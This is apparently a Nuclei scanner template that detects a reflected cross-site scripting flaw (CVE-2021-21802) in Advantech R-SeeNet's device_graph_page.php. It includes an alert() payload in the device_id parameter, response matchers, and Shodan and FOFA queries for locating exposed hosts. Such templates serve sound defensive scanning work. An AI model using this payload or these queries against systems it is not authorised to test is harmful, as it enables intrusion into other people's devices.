id: CVE-2021-21802

info:
  name: Advantech R-SeeNet - Cross-Site Scripting
  author: gy741
  severity: medium
  description: Advantech R-SeeNet contains a cross-site scripting vulnerability in the device_graph_page.php script via the device_id parameter. A specially crafted URL by an attacker can lead to arbitrary JavaScript code execution.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patches or updates provided by Advantech to fix the XSS vulnerability in the R-SeeNet application.
  reference:
    - https://talosintelligence.com/vulnerability_reports/TALOS-2021-1272
    - https://nvd.nist.gov/vuln/detail/CVE-2021-21801
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-21802
    cwe-id: CWE-79
    epss-score: 0.66834
    epss-percentile: 0.9849
    cpe: cpe:2.3:a:advantech:r-seenet:2.4.12:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: advantech
    product: r-seenet
    shodan-query: http.html:"r-seenet"
    fofa-query: body="r-seenet"
  tags: cve2021,cve,rseenet,xss,advantech

http:
  - method: GET
    path:
      - '{{BaseURL}}/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"zlo onerror=alert(1) "'
          - 'Device Status Graph'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a0048304602210080371acf12b4398fcfc99068db3f0d584412b040b89cb3f5ea302dfcbade8a1e022100a96243f6b224c59acd98af8cf7b4bdf430e359e4c0be5c7a2fe3e0fea2d32506:922c64590222798bb761d5b6d8e72950